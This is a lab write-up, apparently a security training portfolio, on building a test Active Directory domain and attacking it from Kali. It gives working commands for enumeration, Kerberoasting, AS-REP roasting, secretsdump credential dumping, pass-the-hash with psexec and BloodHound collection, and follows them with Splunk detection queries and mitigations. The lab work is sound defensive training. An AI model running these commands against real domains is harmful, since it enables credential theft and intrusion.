# Project 02 — Active Directory Lab

**Skills:** Active Directory, Windows Server, Kerberoasting, Pass-the-Hash, BloodHound, Privilege Escalation

---

## Objective

Deploy a realistic Active Directory environment, populate it with simulated users and groups, then execute common AD attack techniques from the Kali Linux attacker machine — mirroring techniques used in real-world red team engagements.

---

## Environment

| VM | Role | IP |
|----|------|----|
| winserver2019 | Domain Controller (lab.local) | 10.20.20.10 |
| win10-client1 | Domain workstation (user: jsmith) | 10.20.20.20 |
| win10-client2 | Domain workstation (user: bwilson) | 10.20.20.21 |
| kali | Attacker | 10.10.10.10 |

---

## Part 1 — Active Directory Setup

### 1.1 Promote Windows Server to Domain Controller

```powershell
# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to DC — creates new forest lab.local
Install-ADDSForest `
  -DomainName "lab.local" `
  -DomainNetbiosName "LAB" `
  -InstallDns `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)
```

### 1.2 Create Users and Groups

```powershell
# Create OUs
New-ADOrganizationalUnit -Name "IT" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Finance" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "DC=lab,DC=local"

# Create regular users
New-ADUser -Name "John Smith" -SamAccountName jsmith -UserPrincipalName jsmith@lab.local `
  -Path "OU=IT,DC=lab,DC=local" -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) `
  -Enabled $true

New-ADUser -Name "Bob Wilson" -SamAccountName bwilson -UserPrincipalName bwilson@lab.local `
  -Path "OU=Finance,DC=lab,DC=local" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
  -Enabled $true

# Create a service account with an SPN (for Kerberoasting)
New-ADUser -Name "svc-sql" -SamAccountName svc-sql -Path "OU=ServiceAccounts,DC=lab,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Sqlservice1!" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity svc-sql -ServicePrincipalNames @{Add="MSSQLSvc/winserver2019.lab.local:1433"}

# Intentionally misconfigure — add jsmith to local admins on win10-client2
# (simulates lateral movement opportunity)
```

### 1.3 Join Clients to Domain

On each Windows 10 VM:

```powershell
Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
```

---

## Part 2 — Enumeration from Kali

### 2.1 Network Reconnaissance

```bash
# Identify live hosts on corporate VLAN
nmap -sn 10.20.20.0/24

# Port scan the DC
nmap -sV -sC -p 88,135,139,389,445,464,636,3268,3269 10.20.20.10
```

### 2.2 SMB Enumeration

```bash
# Enumerate shares
smbclient -L //10.20.20.10 -N
enum4linux -a 10.20.20.10

# Enumerate users via RPC
rpcclient -U "" -N 10.20.20.10
rpcclient> enumdomusers
```

### 2.3 LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.20.20.10 -b "DC=lab,DC=local" -D "" -w "" \
  "(objectClass=person)" sAMAccountName userPrincipalName memberOf
```

---

## Part 3 — Active Directory Attacks

### 3.1 Kerberoasting

Kerberoasting extracts Kerberos TGS tickets for service accounts, which can be cracked offline without sending any traffic to the target.

```bash
# Using Impacket's GetUserSPNs
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  lab.local/jsmith:Welcome1! -dc-ip 10.20.20.10 -request -outputfile kerberoast_hashes.txt

# Crack the TGS ticket offline
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Successfully cracked `svc-sql` password: `Sqlservice1!`

### 3.2 AS-REP Roasting

Targets accounts with "Do not require Kerberos preauthentication" enabled.

```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
  lab.local/ -usersfile users.txt -dc-ip 10.20.20.10 -no-pass -format hashcat
```

### 3.3 Pass-the-Hash

After obtaining an NTLM hash from a credential dump, authenticate as that user without knowing the plaintext password.

```bash
# Dump hashes using secretsdump (requires admin on target)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  lab.local/administrator:P@ssw0rd123!@10.20.20.20

# Pass-the-Hash with psexec
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -hashes :aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> \
  administrator@10.20.20.21
```

### 3.4 BloodHound Attack Path Analysis

```bash
# On win10-client1 (domain-joined), run SharpHound collector
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Import zip into BloodHound on Kali
# Queries run:
# - "Find Shortest Paths to Domain Admins"
# - "Find Principals with DCSync Rights"
# - "List all Kerberoastable Accounts"
```

**Finding:** `jsmith` → `IT Admins` group → `Domain Admins` via nested group membership. This represents a privilege escalation path.

---

## Part 4 — Detection

After each attack, reviewed logs in Splunk and Security Onion:

| Attack | Windows Event ID | SPL Query |
|--------|-----------------|-----------|
| Kerberoasting | 4769 (TGS request, encryption 0x17) | `index=windows EventCode=4769 TicketEncryptionType=0x17` |
| AS-REP Roasting | 4768 (TGS request, PreAuth not required) | `index=windows EventCode=4768 PreAuthType=0` |
| Pass-the-Hash | 4624 (Logon Type 3, NTLM auth) | `index=windows EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM` |
| BloodHound collection | 4662 (Object access on AD) | `index=windows EventCode=4662` |

---

## Mitigations Identified

| Attack | Mitigation |
|--------|-----------|
| Kerberoasting | Use strong, random passwords (25+ chars) for service accounts; use Group Managed Service Accounts (gMSAs) |
| AS-REP Roasting | Require Kerberos preauthentication on all accounts |
| Pass-the-Hash | Enable Protected Users security group; disable NTLM where possible; use Credential Guard |
| Lateral Movement | Implement tiered admin model; restrict local admin rights; use LAPS |

---

## Key Takeaways

- Active Directory misconfigurations (weak service account passwords, overprivileged accounts) are consistently exploited in real engagements
- BloodHound revealed a privilege escalation path that would not have been obvious through manual enumeration
- All attacks generated detectable Windows events — the key is having a SIEM configured to alert on them

---

## Next Steps

→ [Project 03 — Network Scanning & Enumeration](03-network-scanning-enumeration.md)
